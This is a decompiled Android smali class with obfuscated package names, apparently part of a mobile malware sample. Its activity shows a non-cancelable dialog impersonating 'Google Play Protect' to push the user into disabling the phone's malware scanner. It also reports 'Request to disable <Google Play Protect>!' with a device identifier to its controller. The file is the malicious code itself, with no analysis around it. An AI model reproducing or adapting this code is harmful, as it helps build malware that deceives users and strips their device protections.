.class public Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;
.super Landroid/app/Activity;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string p1, "Google Play Protect"

    const-string v0, ""

    const-string v1, ""

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->b:Landroid/content/Context;

    :try_start_0
    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "textPlayProtect"

    invoke-virtual {v2, p0, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "buttonPlayProtect"

    invoke-virtual {v0, p0, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_0
    move-object v2, v0

    :catch_1
    move-object v0, v1

    :goto_0
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "4"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "p="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v7, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "|Request to disable <Google Play Protect>!|"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, p0, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, p1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    invoke-virtual {p1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const/high16 v2, 0x7f020000

    invoke-virtual {p1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const/4 v2, 0x0

    invoke-virtual {p1, v2}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    new-instance v2, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;

    invoke-direct {v2, p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/ovyvpsbxxrtayd;)V

    invoke-virtual {p1, v0, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    :try_start_2
    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/AlertDialog;->show()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    return-void
.end method
